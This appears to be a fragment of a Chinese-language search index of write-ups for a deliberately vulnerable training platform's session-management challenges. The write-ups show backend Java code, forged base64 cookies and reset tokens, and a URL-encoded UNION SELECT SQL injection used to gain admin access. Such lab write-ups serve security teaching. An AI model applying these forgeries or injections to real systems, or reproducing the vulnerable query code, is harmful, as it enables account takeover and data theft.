//\u5224\u65ad\u7528\u6237\u662f\u5426\u662f\u7ba1\u7406\u5458 { log.debug(\"Admin Detected\"); callstmt = conn.prepareStatement(\"SELECT userName, userRole FROM users WHERE userName = ? AND userPassword = SHA(?)\"); //\u5224\u65ad\u7528\u6237\u540d\u548c\u5bc6\u7801\u662f\u5426\u6b63\u786e callstmt.setString(1, subName); callstmt.setString(2, subPass); \u53d1\u73b0\u6ca1\u6709SQL\u6ce8\u5165\u95ee\u9898 \u627e\u56de\u5bc6\u7801\u529f\u80fd\u4ee3\u7801 POST /challenges/7aed58f3a00087d56c844ed9474c671f8999680556c127a19ee79fa5d7a132e1SendToken HTTP/1.1 subUserName=admin \u5bf9\u5e94\u5b9e\u73b0 Object nameObj = request.getParameter(\"subUserName\"); String userName = new String(); if(nameObj != null) userName = (String) nameObj; log.debug(\"subName = \" + userName); log.debug(\"Getting ApplicationRoot\"); String ApplicationRoot = getServletContext().getRealPath(\"\"); log.debug(\"Servlet root = \" + ApplicationRoot ); Connection conn = Database.getChallengeConnection(ApplicationRoot, \"BrokenAuthAndSessMangChalFive\"); log.debug(\"Checking name\"); PreparedStatement callstmt; log.debug(\"Committing changes made to database\"); callstmt = conn.prepareStatement(\"COMMIT\"); callstmt.execute(); log.debug(\"Changes committed.\"); callstmt = conn.prepareStatement(\"SELECT userName FROM users WHERE userName = ?\"); //\u53c2\u6570\u5316\u67e5\u8be2 callstmt.setString(1, userName); log.debug(\"Executing findUser\"); ResultSet resultSet = callstmt.executeQuery(); //Is the username valid? if(resultSet.next()) { log.debug(\"User found\"); //\u53ef\u4ee5\u5224\u65ad\u7528\u6237\u540d\u662f\u5426\u5b58\u5728 htmlOutput = bundle.getString(\"setToken.sentTo.1\") + \" '\" + Encode.forHtml(userName) + \"' \" + bundle.getString(\"setToken.sentTo.2\"); } else \u53ea\u80fd\u5224\u65ad\u7528\u6237\u540d\u662f\u5426\u5b58\u5728 \u4ece\u9875\u9762html\u4e2d\u53ef\u4ee5\u627e\u5230\u91cd\u7f6e\u7528\u6237\u540d\u548c\u5bc6\u7801\u7684\u94fe\u63a5 POST /challenges/7aed58f3a00087d56c844ed9474c671f8999680556c127a19ee79fa5d7a132e1ChangePass HTTP/1.1 userName=admin&newPassword=password&resetPasswordToken=U3RhIFNlcCAxOCAwODoyODoxMCBCU1QgMjAyMQ== \u524d\u4e24\u4e2a\u53c2\u6570\u6bd4\u8f83\u597d\u7406\u89e3\uff0c\u6700\u540e\u4e00\u4e2a\u53c2\u6570\uff0c\u9ed1\u76d2\u662f\u975e\u5e38\u96be\u60f3\u5230\u7684 Object tokenObj = request.getParameter(\"resetPasswordToken\"); String userName = new String(); String newPass = new String(); String token = new String(); if(passNewObj != null) newPass = (String) passNewObj; if(userNewObj != null) userName = (String) userNewObj; if(tokenObj != null) token = (String) tokenObj; log.debug(\"userName = \" + userName); log.debug(\"newPass = \" + newPass); log.debug(\"token = \" + token); String tokenTime = new String(); try { byte[] decodedToken = Base64.decodeBase64(token); tokenTime = new String(decodedToken, \"UTF-8\"); } catch (UnsupportedEncodingException e) { log.debug(\"Could not decode password token\"); errorMessage += \"<p>\" + bundle.getString(\"changePass.noDecode\") + \"</p>\"; } if(tokenTime.isEmpty()) { log.debug(\"Could not decode token. Ending Servlet.\"); out.write(errorMessage); } else { log.debug(\"Decoded Token = \" + tokenTime); //Get Time from Token and see if it is inside the last 10 minutes SimpleDateFormat simpleDateFormat = new SimpleDateFormat(\"EEE MMM d HH:mm:ss Z yyyy\"); //\u65f6\u95f4\u683c\u5f0f \u5fc5\u987b\u662f\u8fd9\u79cd try { Date tokenDateTime = simpleDateFormat.parse(tokenTime); Date currentDateTime = new Date(); //Get difference in minutes tokenLife = (int)((currentDateTime.getTime()/60000) - (tokenDateTime.getTime()/60000)); log.debug(\"Token life = \" + tokenLife); } catch (ParseException e)","title":"\u529f\u80fd\u5b9e\u73b0"},{"location":"vul/Session-Management-Challenge-Five.html#_3","text":"\u9700\u8981\u77e5\u9053\u670d\u52a1\u5668\u5f53\u524d\u7684 EEE MMM d HH ss Z yyyy \uff0c\u7136\u540ebase64\u7f16\u7801 \u670d\u52a1\u5668\u7684\u65f6\u95f4\u53ef\u80fd\u4e0d\u662f\u5f53\u524d\u65f6\u95f4\uff0c\u6240\u4ee5\u6267\u884c date\u547d\u4ee4 \u8fdb\u884c\u67e5\u770b","title":"\u89e3\u9898\u6b65\u9aa4"},{"location":"vul/Session-Management-Challenge-Five.html#_4","text":"\u6709\u4e9b\u95ee\u9898\u4e0d\u8fdb\u884c\u4ee3\u7801\u5ba1\u8ba1\u662f\u5f88\u96be\u53d1\u73b0\u7684,\u6240\u4ee5\u4fdd\u62a4\u597d\u81ea\u5df1\u7684\u6e90\u4ee3\u7801\u662f\u975e\u5e38\u6709\u5fc5\u8981\u7684","title":"\u603b\u7ed3"},{"location":"vul/Session-Management-Challenge-Four.html","text":"Session Management Challenge Four(\u4f1a\u8bdd\u7ba1\u7406 4) \u00b6 \u9898\u4ecb\u7ecd \u00b6 \u9700\u8981\u83b7\u5f97\u4e00\u4e2a\u7ba1\u7406\u8eab\u4efd \u529f\u80fd\u5b9e\u73b0 \u00b6 \u8bf7\u6c42\u6570\u636e\u5305 POST /challenges/ec43ae137b8bf7abb9c85a87cf95c23f7fadcf08a092e05620c9968bd60fcba6 HTTP/1.1 Cookie: current=WjNWbGMzUXhNZz09; SubSessionID=TURBd01EQXdNREF3TURBd01EQXdNUT09; JSESSIONID=AFBC4851A5AC73AFE2032E487ADE0EF5; token=-32864054630884368385257168535939963911 userId=0000000000000001&useSecurity=true \u5bf9\u5e94\u4ee3\u7801 src/main/java/servlets/module/challenge/SessionManagement4.java Cookie userCookies[] = request.getCookies(); int i = 0; Cookie theCookie = null; for(i = 0; i < userCookies.length; i++) { if(userCookies[i].getName().compareTo(\"SubSessionID\") == 0) //\u83b7\u5f97cookie\u4e2d\u7684 SubSessionID { theCookie = userCookies[i]; break; //End Loop, because we found the token } } String htmlOutput = null; if(theCookie != null) { log.debug(\"Cookie value: \" + theCookie.getValue()); //Decode Twice byte[] decodedCookieBytes = Base64.decodeBase64(theCookie.getValue()); //\u4e24\u6b21\u89e3\u7801 \u83b7\u5f97\u660e\u6587 String decodedCookie = new String(decodedCookieBytes, \"UTF-8\"); decodedCookieBytes = Base64.decodeBase64(decodedCookie.getBytes()); decodedCookie = new String(decodedCookieBytes, \"UTF-8\"); log.debug(\"Decoded Cookie: \" + decodedCookie); if(decodedCookie.equals(\"0000000000000001\")) //Guest Session { log.debug(\"Guest Session Detected\"); } else if (decodedCookie.equals(\"0000000000000021\")) //Admin Session //\u5224\u65ad\u662f\u5426\u662f\u7ba1\u7406\u5458 { log.debug(\"Admin Session Detected: Challenge Complete\"); \u89e3\u9898\u6b65\u9aa4 \u00b6 \u66ff\u6362cookie\u7684SubSessionID \u503c\u4e3a base64(base64(0000000000000021)) \u603b\u7ed3 \u00b6 \u5ba2\u6237\u7aef\u8f93\u5165\u5185\u5bb9\u662f\u4e0d\u53ef\u4fe1\u7684\uff0c\u4e0d\u8981\u4f7f\u7528\u4e0d\u5b89\u5168\u7684\u7f16\u7801\u5728\u5ba2\u6237\u7aef\u4fdd\u5b58\u654f\u611f\u4fe1\u606f","title":"Session Management Challenge Four(\u4f1a\u8bdd\u7ba1\u7406 4)"},{"location":"vul/Session-Management-Challenge-Four.html#session-management-challenge-four-4","text":"","title":"Session Management Challenge Four(\u4f1a\u8bdd\u7ba1\u7406 4)"},{"location":"vul/Session-Management-Challenge-Four.html#_1","text":"\u9700\u8981\u83b7\u5f97\u4e00\u4e2a\u7ba1\u7406\u8eab\u4efd","title":"\u9898\u4ecb\u7ecd"},{"location":"vul/Session-Management-Challenge-Four.html#_2","text":"\u8bf7\u6c42\u6570\u636e\u5305 POST /challenges/ec43ae137b8bf7abb9c85a87cf95c23f7fadcf08a092e05620c9968bd60fcba6 HTTP/1.1 Cookie: current=WjNWbGMzUXhNZz09; SubSessionID=TURBd01EQXdNREF3TURBd01EQXdNUT09; JSESSIONID=AFBC4851A5AC73AFE2032E487ADE0EF5; token=-32864054630884368385257168535939963911 userId=0000000000000001&useSecurity=true \u5bf9\u5e94\u4ee3\u7801 src/main/java/servlets/module/challenge/SessionManagement4.java Cookie userCookies[] = request.getCookies(); int i = 0; Cookie theCookie = null; for(i = 0; i < userCookies.length; i++) { if(userCookies[i].getName().compareTo(\"SubSessionID\") == 0) //\u83b7\u5f97cookie\u4e2d\u7684 SubSessionID { theCookie = userCookies[i]; break; //End Loop, because we found the token } } String htmlOutput = null; if(theCookie != null) { log.debug(\"Cookie value: \" + theCookie.getValue()); //Decode Twice byte[] decodedCookieBytes = Base64.decodeBase64(theCookie.getValue()); //\u4e24\u6b21\u89e3\u7801 \u83b7\u5f97\u660e\u6587 String decodedCookie = new String(decodedCookieBytes, \"UTF-8\"); decodedCookieBytes = Base64.decodeBase64(decodedCookie.getBytes()); decodedCookie = new String(decodedCookieBytes, \"UTF-8\"); log.debug(\"Decoded Cookie: \" + decodedCookie); if(decodedCookie.equals(\"0000000000000001\")) //Guest Session { log.debug(\"Guest Session Detected\"); } else if (decodedCookie.equals(\"0000000000000021\")) //Admin Session //\u5224\u65ad\u662f\u5426\u662f\u7ba1\u7406\u5458 { log.debug(\"Admin Session Detected: Challenge Complete\");","title":"\u529f\u80fd\u5b9e\u73b0"},{"location":"vul/Session-Management-Challenge-Four.html#_3","text":"\u66ff\u6362cookie\u7684SubSessionID \u503c\u4e3a base64(base64(0000000000000021))","title":"\u89e3\u9898\u6b65\u9aa4"},{"location":"vul/Session-Management-Challenge-Four.html#_4","text":"\u5ba2\u6237\u7aef\u8f93\u5165\u5185\u5bb9\u662f\u4e0d\u53ef\u4fe1\u7684\uff0c\u4e0d\u8981\u4f7f\u7528\u4e0d\u5b89\u5168\u7684\u7f16\u7801\u5728\u5ba2\u6237\u7aef\u4fdd\u5b58\u654f\u611f\u4fe1\u606f","title":"\u603b\u7ed3"},{"location":"vul/Session-Management-Challenge-One.html","text":"Session Management Challenge One(\u4f1a\u8bdd\u7ba1\u7406 1) \u00b6 \u9898\u4ecb\u7ecd \u00b6 \u9700\u8981\u4f2a\u88c5\u6210\u7ba1\u7406\u5458\u6743\u9650\u624d\u80fd\u83b7\u5f97\u901a\u5173\u5bc6\u94a5 \u529f\u80fd\u5b9e\u73b0 \u00b6 \u70b9\u51fb\u754c\u9762\u6309\u94ae \uff0c\u6293\u53d6\u6570\u636e\u5305 POST /challenges/dfd6bfba1033fa380e378299b6a998c759646bd8aea02511482b8ce5d707f93a HTTP/1.1 Cookie: checksum=dXNlclJvbGU9dXNlcg==; JSESSIONID=A32F61E937D764CDA542BC940323D455; token=66329888183457720076675536392112351575 adminDetected=false&returnPassword=false&upgradeUserToAdmin=false \u5bf9\u5e94\u540e\u7aef\u4ee3\u7801 /src/main/java/servlets/module/challenge/SessionManagement1.java Cookie userCookies[] = request.getCookies(); //\u8bfb\u53d6cookie int i = 0; Cookie theCookie = null; for(i = 0; i < userCookies.length; i++) { if(userCookies[i].getName().compareTo(\"checksum\") == 0) //\u67e5\u627ecookie\u4e2d\u7684 checksum \u5b57\u6bb5 { theCookie = userCookies[i]; break; //End Loop, because we found the token } } String htmlOutput = null; if(theCookie != null) { log.debug(\"Cookie value: \" + theCookie.getValue()); byte[] decodedCookieBytes = Base64.decodeBase64(theCookie.getValue()); // base64\u89e3\u7801 String decodedCookie = new String(decodedCookieBytes, \"UTF-8\"); log.debug(\"Decoded Cookie: \" + decodedCookie); if(decodedCookie.equals(\"userRole=administrator\")) // \u5224\u65ad cookie\u4e2d\u7684checksum\u503c\u662f\u5426\u662f userRole=administrator \u7684base64\u7f16\u7801\u540e\u5185\u5bb9\uff0c\u5982\u679c\u662f \u5219\u8fd4\u56de\u901a\u5173\u5bc6\u94a5 { log.debug(\"Challenge Complete\"); \u89e3\u9898\u6b65\u9aa4 \u00b6 \u5c06 userRole=administrator \u8fdb\u884cbase64\u7f16\u7801\uff0c\u66ff\u6362\u6389cookie\u4e2d\u7684 checksum \u603b\u7ed3 \u00b6 \u7528\u6237\u7aef\u63d0\u4ea4\u7684\u6570\u636e\u90fd\u662f\u53ef\u4ee5\u88ab\u7be1\u6539\u7684\uff0c\u6838\u5fc3\u5224\u65ad\u4fe1\u606f\uff0c\u5982\u6743\u9650\u7b49\uff0c\u5efa\u8bae\u4fdd\u5b58\u5230\u670d\u52a1\u7aef\uff0c\u5982session \u6c49\u5316\u8bf4\u660e \u00b6 \u6dfb\u52a0\u6587\u4ef6 src/main/resources/i18n/challenges/sessionManagement/dfd6bfba1033fa380e378299b6a998c759646bd8aea02511482b8ce5d707f93a_zh.properties","title":"Session Management Challenge One(\u4f1a\u8bdd\u7ba1\u7406 1)"},{"location":"vul/Session-Management-Challenge-One.html#session-management-challenge-one-1","text":"","title":"Session Management Challenge One(\u4f1a\u8bdd\u7ba1\u7406 1)"},{"location":"vul/Session-Management-Challenge-One.html#_1","text":"\u9700\u8981\u4f2a\u88c5\u6210\u7ba1\u7406\u5458\u6743\u9650\u624d\u80fd\u83b7\u5f97\u901a\u5173\u5bc6\u94a5","title":"\u9898\u4ecb\u7ecd"},{"location":"vul/Session-Management-Challenge-One.html#_2","text":"\u70b9\u51fb\u754c\u9762\u6309\u94ae \uff0c\u6293\u53d6\u6570\u636e\u5305 POST /challenges/dfd6bfba1033fa380e378299b6a998c759646bd8aea02511482b8ce5d707f93a HTTP/1.1 Cookie: checksum=dXNlclJvbGU9dXNlcg==; JSESSIONID=A32F61E937D764CDA542BC940323D455; token=66329888183457720076675536392112351575 adminDetected=false&returnPassword=false&upgradeUserToAdmin=false \u5bf9\u5e94\u540e\u7aef\u4ee3\u7801 /src/main/java/servlets/module/challenge/SessionManagement1.java Cookie userCookies[] = request.getCookies(); //\u8bfb\u53d6cookie int i = 0; Cookie theCookie = null; for(i = 0; i < userCookies.length; i++) { if(userCookies[i].getName().compareTo(\"checksum\") == 0) //\u67e5\u627ecookie\u4e2d\u7684 checksum \u5b57\u6bb5 { theCookie = userCookies[i]; break; //End Loop, because we found the token } } String htmlOutput = null; if(theCookie != null) { log.debug(\"Cookie value: \" + theCookie.getValue()); byte[] decodedCookieBytes = Base64.decodeBase64(theCookie.getValue()); // base64\u89e3\u7801 String decodedCookie = new String(decodedCookieBytes, \"UTF-8\"); log.debug(\"Decoded Cookie: \" + decodedCookie); if(decodedCookie.equals(\"userRole=administrator\")) // \u5224\u65ad cookie\u4e2d\u7684checksum\u503c\u662f\u5426\u662f userRole=administrator \u7684base64\u7f16\u7801\u540e\u5185\u5bb9\uff0c\u5982\u679c\u662f \u5219\u8fd4\u56de\u901a\u5173\u5bc6\u94a5 { log.debug(\"Challenge Complete\");","title":"\u529f\u80fd\u5b9e\u73b0"},{"location":"vul/Session-Management-Challenge-One.html#_3","text":"\u5c06 userRole=administrator \u8fdb\u884cbase64\u7f16\u7801\uff0c\u66ff\u6362\u6389cookie\u4e2d\u7684 checksum","title":"\u89e3\u9898\u6b65\u9aa4"},{"location":"vul/Session-Management-Challenge-One.html#_4","text":"\u7528\u6237\u7aef\u63d0\u4ea4\u7684\u6570\u636e\u90fd\u662f\u53ef\u4ee5\u88ab\u7be1\u6539\u7684\uff0c\u6838\u5fc3\u5224\u65ad\u4fe1\u606f\uff0c\u5982\u6743\u9650\u7b49\uff0c\u5efa\u8bae\u4fdd\u5b58\u5230\u670d\u52a1\u7aef\uff0c\u5982session","title":"\u603b\u7ed3"},{"location":"vul/Session-Management-Challenge-One.html#_5","text":"\u6dfb\u52a0\u6587\u4ef6 src/main/resources/i18n/challenges/sessionManagement/dfd6bfba1033fa380e378299b6a998c759646bd8aea02511482b8ce5d707f93a_zh.properties","title":"\u6c49\u5316\u8bf4\u660e"},{"location":"vul/Session-Management-Challenge-Seven.html","text":"Session Management Challenge Seven(\u4f1a\u8bdd\u7ba1\u7406 7) \u00b6 \u9898\u4ecb\u7ecd \u00b6 \u9700\u8981\u8f93\u5165\u7528\u6237\u540d\u548c\u5bc6\u7801 \u529f\u80fd\u5b9e\u73b0 \u00b6 \u770b\u4e86\u4e00\u4e0b\u5b8c\u6574\u529f\u80fd,\u6ca1\u53d1\u73b0\u6709\u57fa\u7840\u5b89\u5168\u6f0f\u6d1e \u89e3\u9898\u6b65\u9aa4 \u00b6 \u6700\u7ec8\u770b\u4e86\u4e00\u4e0b\u7b54\u6848,\u53d1\u73b0 \u5c31\u662f\u4f9d\u8d56 What is your favourite flower? \u63d0\u793a\uff0c\u8fdb\u884c\u731c\u6d4b...\u6709\u6548\u5217\u8868 Jade Vine, Corpse Flower, Gibraltar Campion, Franklin Tree, Middlemist Red, Chocolate Cosmos or Ghost Orchid \u80fd\u591f\u83b7\u5f97\u5bc6\u94a5\u7684\u662f Franklin Tree \u603b\u7ed3 \u00b6 \u6d4b\u8bd5\u7684\u6700\u9ad8\u5883\u754c\uff0c\u53ef\u80fd\u5c31\u662f\u51ed\u501f\u7ecf\u9a8c\u8fdb\u884c\u731c\u6d4b","title":"Session Management Challenge Seven(\u4f1a\u8bdd\u7ba1\u7406 7)"},{"location":"vul/Session-Management-Challenge-Seven.html#session-management-challenge-seven-7","text":"","title":"Session Management Challenge Seven(\u4f1a\u8bdd\u7ba1\u7406 7)"},{"location":"vul/Session-Management-Challenge-Seven.html#_1","text":"\u9700\u8981\u8f93\u5165\u7528\u6237\u540d\u548c\u5bc6\u7801","title":"\u9898\u4ecb\u7ecd"},{"location":"vul/Session-Management-Challenge-Seven.html#_2","text":"\u770b\u4e86\u4e00\u4e0b\u5b8c\u6574\u529f\u80fd,\u6ca1\u53d1\u73b0\u6709\u57fa\u7840\u5b89\u5168\u6f0f\u6d1e","title":"\u529f\u80fd\u5b9e\u73b0"},{"location":"vul/Session-Management-Challenge-Seven.html#_3","text":"\u6700\u7ec8\u770b\u4e86\u4e00\u4e0b\u7b54\u6848,\u53d1\u73b0 \u5c31\u662f\u4f9d\u8d56 What is your favourite flower? \u63d0\u793a\uff0c\u8fdb\u884c\u731c\u6d4b...\u6709\u6548\u5217\u8868 Jade Vine, Corpse Flower, Gibraltar Campion, Franklin Tree, Middlemist Red, Chocolate Cosmos or Ghost Orchid \u80fd\u591f\u83b7\u5f97\u5bc6\u94a5\u7684\u662f Franklin Tree","title":"\u89e3\u9898\u6b65\u9aa4"},{"location":"vul/Session-Management-Challenge-Seven.html#_4","text":"\u6d4b\u8bd5\u7684\u6700\u9ad8\u5883\u754c\uff0c\u53ef\u80fd\u5c31\u662f\u51ed\u501f\u7ecf\u9a8c\u8fdb\u884c\u731c\u6d4b","title":"\u603b\u7ed3"},{"location":"vul/Session-Management-Challenge-Six.html","text":"Session Management Challenge Six(\u4f1a\u8bdd\u7ba1\u7406 6) \u00b6 \u9898\u4ecb\u7ecd \u00b6 \u9700\u8981\u83b7\u5f97\u7ba1\u7406\u5458\u6743\u9650 \u529f\u80fd\u5b9e\u73b0 \u00b6 \u8bf7\u6c42\u6570\u636e\u5305 POST /challenges/b5e1020e3742cf2c0880d4098146c4dde25ebd8ceab51807bad88ff47c316ece HTTP/1.1 Cookie: current=WjNWbGMzUXhNZz09; SubSessionID=TURBd01EQXdNREF3TURBd01EQXdNUT09; securityMisconfigLesson=8a3a691885e0014f25a930658c371cc376d7b2734953a536c0f834e318a6ece9; currentPerson=YUd1ZXN0; ac=ZG9Ob3RSZXR1cm5BbnN3ZXJz; JSESSIONID=97FD1A94D1A96ACD1BB31BFB000F40D8; token=50163458658349300026575546979087684293 subName=root&subPassword=test \u7528\u6237\u540d\u5fc5\u987b\u6b63\u786e\uff0c\u624d\u80fd\u83b7\u5f97\u90ae\u7bb1\u5730\u5740,\u4ee3\u7801\u5982\u4e0b subPass = subPass.replaceAll(\"!\", \"\"); callstmt = conn.prepareStatement(\"SELECT userName, userAddress FROM users WHERE userName = ? AND userPassword = SHA(?)\"); callstmt.setString(1, subName); callstmt.setString(2, subPass); log.debug(\"Executing authUser\"); ResultSet resultSet = callstmt.executeQuery(); if(resultSet.next()) { //This should never happen. But just in case; log.debug(\"Successful Login\"); // Get key and add it to the output String userKey = Hash.generateUserSolution(Getter.getModuleResultFromHash(ApplicationRoot, levelHash), (String)ses.getAttribute(\"userName\")); htmlOutput = \"<h2 class='title'>\" + bundle.getString(\"response.welcome\") + \" \" + Encode.forHtml(resultSet.getString(1)) + \"</h2>\" + \"<p>\" + bundle.getString(\"response.resultKey\") + \" <a>\" + userKey + \"</a>\" + \"</p>\"; } else { log.debug(\"Incorrect credentials, checking if user name correct\"); callstmt = conn.prepareStatement(\"SELECT userAddress FROM users WHERE userName = ?\"); //\u5224\u65ad\u7528\u6237\u540d\u662f\u5426\u5b58\u5728 \u8fd4\u56de\u90ae\u7bb1\u5730\u5740 callstmt.setString(1, subName); log.debug(\"Executing getAddress\"); resultSet = callstmt.executeQuery(); if(resultSet.next()) { log.debug(\"User Found\"); userAddress = \"\" + bundle.getString(\"response.badPass\") + \" <a>\" + Encode.forHtml(resultSet.getString(1)) + \"</a><br/>\"; } else { userAddress = \"\" + bundle.getString(\"response.badUser\") + \"<br/>\"; } htmlOutput = makeTable(userAddress, bundle); } \u90ae\u7bb1\u9a8c\u8bc1 \u8bf7\u6c42 GET /challenges/b5e1020e3742cf2c0880d4098146c4dde25ebd8ceab51807bad88ff47c316eceSecretQuestion?subEmail=test HTTP/1.1 Cookie: current=WjNWbGMzUXhNZz09; SubSessionID=TURBd01EQXdNREF3TURBd01EQXdNUT09; securityMisconfigLesson=8a3a691885e0014f25a930658c371cc376d7b2734953a536c0f834e318a6ece9; currentPerson=YUd1ZXN0; ac=ZG9Ob3RSZXR1cm5BbnN3ZXJz; JSESSIONID=97FD1A94D1A96ACD1BB31BFB000F40D8; token=50163458658349300026575546979087684293 \u5b58\u5728SQL\u6ce8\u5165 Object emailObj = request.getParameter(\"subEmail\"); String subEmail = Validate.validateParameter(emailObj, 75); log.debug(\"subEmail = \" + subEmail); String ApplicationRoot = getServletContext().getRealPath(\"\"); try { if(subEmail.length() < 10) { log.debug(\"Invalid data submitted\"); htmlOutput = new String(\"<b>\" + bundle.getString(\"question.invalidData\") + \": </b>\" + bundle.getString(\"question.invalidEmail\")); } else { Connection conn = Database.getChallengeConnection(ApplicationRoot, \"BrokenAuthAndSessMangChalSix\"); log.debug(\"Getting Secret Question\"); PreparedStatement callstmt = conn.prepareStatement(\"SELECT secretQuestion FROM users WHERE userAddress = \\\"\" + subEmail +\"\\\"\"); //\u5b58\u5728SQL\u6ce8\u5165 ResultSet rs = callstmt.executeQuery(); if(rs.next()) { log.debug(\"'Valid' User Detected\"); log.debug(\"Encoding for output: \" + rs.getString(1)); //rs.getString(1) contains the question for the user to answer. This question is asked in English as it must be answered in English to successfully pass the level htmlOutput = new String(Encode.forHtml(rs.getString(1))); } \u89e3\u9898\u6b65\u9aa4 \u00b6 \u83b7\u5f97\u7b54\u6848 GET /challenges/b5e1020e3742cf2c0880d4098146c4dde25ebd8ceab51807bad88ff47c316eceSecretQuestion?subEmail=%22%20%55%4e%49%4f%4e%20%53%45%4c%45%43%54%20%73%65%63%72%65%74%41%6e%73%77%65%72%20%46%52%4f%4d%20%75%73%65%72%73%20%57%48%45%52%45%20%75%73%65%72%4e%61%6d%65%3d%22%72%6f%6f%74 HTTP/1.1 \u63d0\u4ea4\u5373\u53ef \u603b\u7ed3 \u00b6 \u57fa\u7840\u5b89\u5168\u95ee\u9898\uff0c\u9700\u8981\u5f7b\u5e95\u89e3\u51b3\uff0c\u5426\u5219\u4f1a\u88ab\u7efc\u5408\u5229\u7528","title":"Session Management Challenge Six(\u4f1a\u8bdd\u7ba1\u7406 6)"},{"location":"vul/Session-Management-Challenge-Six.html#session-management-challenge-six-6","text":"","title":"Session Management Challenge Six(\u4f1a\u8bdd\u7ba1\u7406 6)"},{"location":"vul/Session-Management-Challenge-Six.html#_1","text":"\u9700\u8981\u83b7\u5f97\u7ba1\u7406\u5458\u6743\u9650","title":"\u9898\u4ecb\u7ecd"},{"location":"vul/Session-Management-Challenge-Six.html#_2","text":"\u8bf7\u6c42\u6570\u636e\u5305 POST /challenges/b5e1020e3742cf2c0880d4098146c4dde25ebd8ceab51807bad88ff47c316ece HTTP/1.1 Cookie: current=WjNWbGMzUXhNZz09; SubSessionID=TURBd01EQXdNREF3TURBd01EQXdNUT09; securityMisconfigLesson=8a3a691885e0014f25a930658c371cc376d7b2734953a536c0f834e318a6ece9; currentPerson=YUd1ZXN0; ac=ZG9Ob3RSZXR1cm5BbnN3ZXJz; JSESSIONID=97FD1A94D1A96ACD1BB31BFB000F40D8; token=50163458658349300026575546979087684293 subName=root&subPassword=test \u7528\u6237\u540d\u5fc5\u987b\u6b63\u786e\uff0c\u624d\u80fd\u83b7\u5f97\u90ae\u7bb1\u5730\u5740,\u4ee3\u7801\u5982\u4e0b subPass = subPass.replaceAll(\"!\", \"\"); callstmt = conn.prepareStatement(\"SELECT userName, userAddress FROM users WHERE userName = ? AND userPassword = SHA(?)\"); callstmt.setString(1, subName); callstmt.setString(2, subPass); log.debug(\"Executing authUser\"); ResultSet resultSet = callstmt.executeQuery(); if(resultSet.next()) { //This should never happen. But just in case; log.debug(\"Successful Login\"); // Get key and add it to the output String userKey = Hash.generateUserSolution(Getter.getModuleResultFromHash(ApplicationRoot, levelHash), (String)ses.getAttribute(\"userName\")); htmlOutput = \"<h2 class='title'>\" + bundle.getString(\"response.welcome\") + \" \" + Encode.forHtml(resultSet.getString(1)) + \"</h2>\" + \"<p>\" + bundle.getString(\"response.resultKey\") + \" <a>\" + userKey + \"</a>\" + \"</p>\"; } else { log.debug(\"Incorrect credentials, checking if user name correct\"); callstmt = conn.prepareStatement(\"SELECT userAddress FROM users WHERE userName = ?\"); //\u5224\u65ad\u7528\u6237\u540d\u662f\u5426\u5b58\u5728 \u8fd4\u56de\u90ae\u7bb1\u5730\u5740 callstmt.setString(1, subName); log.debug(\"Executing getAddress\"); resultSet = callstmt.executeQuery(); if(resultSet.next()) { log.debug(\"User Found\"); userAddress = \"\" + bundle.getString(\"response.badPass\") + \" <a>\" + Encode.forHtml(resultSet.getString(1)) + \"</a><br/>\"; } else { userAddress = \"\" + bundle.getString(\"response.badUser\") + \"<br/>\"; } htmlOutput = makeTable(userAddress, bundle); } \u90ae\u7bb1\u9a8c\u8bc1 \u8bf7\u6c42 GET /challenges/b5e1020e3742cf2c0880d4098146c4dde25ebd8ceab51807bad88ff47c316eceSecretQuestion?subEmail=test HTTP/1.1 Cookie: current=WjNWbGMzUXhNZz09; SubSessionID=TURBd01EQXdNREF3TURBd01EQXdNUT09; securityMisconfigLesson=8a3a691885e0014f25a930658c371cc376d7b2734953a536c0f834e318a6ece9; currentPerson=YUd1ZXN0; ac=ZG9Ob3RSZXR1cm5BbnN3ZXJz; JSESSIONID=97FD1A94D1A96ACD1BB31BFB000F40D8; token=50163458658349300026575546979087684293 \u5b58\u5728SQL\u6ce8\u5165 Object emailObj = request.getParameter(\"subEmail\"); String subEmail = Validate.validateParameter(emailObj, 75); log.debug(\"subEmail = \" + subEmail); String ApplicationRoot = getServletContext().getRealPath(\"\"); try { if(subEmail.length() < 10) { log.debug(\"Invalid data submitted\"); htmlOutput = new String(\"<b>\" + bundle.getString(\"question.invalidData\") + \": </b>\" + bundle.getString(\"question.invalidEmail\")); } else { Connection conn = Database.getChallengeConnection(ApplicationRoot, \"BrokenAuthAndSessMangChalSix\"); log.debug(\"Getting Secret Question\"); PreparedStatement callstmt = conn.prepareStatement(\"SELECT secretQuestion FROM users WHERE userAddress = \\\"\" + subEmail +\"\\\"\"); //\u5b58\u5728SQL\u6ce8\u5165 ResultSet rs = callstmt.executeQuery(); if(rs.next()) { log.debug(\"'Valid' User Detected\"); log.debug(\"Encoding for output: \" + rs.getString(1)); //rs.getString(1) contains the question for the user to answer. This question is asked in English as it must be answered in English to successfully pass the level htmlOutput = new String(Encode.forHtml(rs.getString(1))); }","title":"\u529f\u80fd\u5b9e\u73b0"},{"location":"vul/Session-Management-Challenge-Six.html#_3","text":"\u83b7\u5f97\u7b54\u6848 GET /challenges/b5e1020e3742cf2c0880d4098146c4dde25ebd8ceab51807bad88ff47c316eceSecretQuestion?subEmail=%22%20%55%4e%49%4f%4e%20%53%45%4c%45%43%54%20%73%65%63%72%65%74%41%6e%73%77%65%72%20%46%52%4f%4d%20%75%73%65%72%73%20%57%48%45%52%45%20%75%73%65%72%4e%61%6d%65%3d%22%72%6f%6f%74 HTTP/1.1 \u63d0\u4ea4\u5373\u53ef","title":"\u89e3\u9898\u6b65\u9aa4"},{"location":"vul/Session-Management-Challenge-Six.html#_4","text":"\u57fa\u7840\u5b89\u5168\u95ee\u9898\uff0c\u9700\u8981\u5f7b\u5e95\u89e3\u51b3\uff0c\u5426\u5219\u4f1a\u88ab\u7efc\u5408\u5229\u7528","title":"\u603b\u7ed3"},{"location":"vul/Session-Management-Challenge-Three.html","text":"Session Management Challenge Three(\u4f1a\u8bdd\u7ba1\u7406 3) \u00b6 \u9898\u4ecb\u7ecd \u00b6 \u9700\u8981\u8f93\u5165\u7ba1\u7406\u5458\u8d26\u53f7\u548c\u5bc6\u7801\u624d\u80fd\u83b7\u5f97\u901a\u5173\u5bc6\u94a5 \u529f\u80fd\u5b9e\u73b0 \u00b6 \u8f93\u5165\u4efb\u610f\u8d26\u53f7\u548c\u5bc6\u7801\uff0c\u70b9\u51fb\u63d0\u4ea4 POST /challenges/t193c6634f049bcf65cdcac72269eeac25dbb2a6887bdb38873e57d0ef447bc3 HTTP/1.1 subUserName=admin&subUserPassword=password \u5bf9\u5e94\u5b9e\u73b0\u4ee3\u7801 